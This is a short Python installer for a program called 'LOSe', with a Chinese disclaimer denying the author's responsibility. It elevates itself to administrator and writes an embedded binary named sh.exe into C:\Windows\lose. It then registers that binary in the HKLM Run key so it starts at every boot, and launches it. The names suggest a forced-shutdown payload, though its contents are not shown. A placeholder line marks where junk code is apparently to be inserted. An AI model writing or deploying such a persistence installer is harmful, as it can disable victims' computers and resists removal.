import shutdown, pyuac, os
from sys import exit as quit

if not pyuac.isUserAdmin(): pyuac.runAsAdmin()
dirc = 'C:\\Windows\\lose'
os.system('title "LOSe 安装程序"')
try: os.mkdir(dirc)
except FileNotFoundError:
    quit()
except FileExistsError:
    pass
os.chdir(dirc)
print('LOSe 安装程序')
print()
print('输入 I agree 同意免责声明以安装')
print('''\
免责声明

作者对使用、传播造成的后果概不负责。
2022.2.27
''')
agree = input()=='I agree'
if not agree: quit()
f = open('sh.exe', 'wb')
f.write(shutdown.shs)
f.close()
os.environ['shs'] = dirc
os.system('reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Shell /t REG_SZ /d "%s\sh.exe" /f'%dirc)
os.startfile('sh.exe')
_RPL_HERE_USELESS_CODE_
